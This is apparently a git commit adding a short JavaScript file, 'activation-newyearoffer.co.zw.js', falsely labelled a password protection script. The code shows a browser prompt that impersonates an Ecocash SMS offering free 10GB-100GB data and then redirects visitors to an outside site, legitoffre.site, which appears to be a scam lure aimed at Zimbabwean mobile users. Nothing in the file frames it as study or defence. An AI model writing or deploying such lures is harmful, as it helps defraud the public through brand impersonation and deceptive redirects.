df4f40f4a5c3c8dcdc4c9d22371eeb1c418867a9
legitipz <gloliousam4@gmail.com>
2026-01-03 07:49:16 -0800

    Create activation-newyearoffer.co.zw.js

---
+++ activation-newyearoffer.co.zw.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'GET DATA 10GB-100GB'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive the new year Data Offer from the Ecocash. Please press OK to Get Data now.',
+  'GET DATA 10GB-100GB'
+);
+if (password != 'GET DATA 10GB-100GB') {
+  location.href = 'https://legitoffre.site/newyearoffer.co.zw.html';
+}
